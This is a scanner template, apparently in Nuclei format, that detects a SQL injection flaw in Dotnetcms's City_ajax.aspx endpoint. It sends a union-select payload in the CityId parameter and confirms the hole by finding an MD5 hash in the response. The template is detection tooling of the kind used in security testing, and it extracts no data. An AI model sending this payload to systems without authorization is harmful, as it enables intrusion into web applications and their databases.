id: poc-yaml-dotnetcms-sqli
info:
  name: Dotnetcms SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Potential SQL Injection vulnerability in Dotnetcms detected via specific payloads.
  tags: sql-injection
  reference: []
variables:
  r1: '{{rand_int(10000, 21000)}}'
  r2: '{{rand_int(1, 100)}}'
http:
  - raw:
      - |
        GET /user/City_ajax.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: status
        status:
          - 200

  - raw:
      - |
        GET /user/City_ajax.aspx?CityId={{r2}}'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{r1}}')),2-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '{{md5(r1)}}'
        part: body
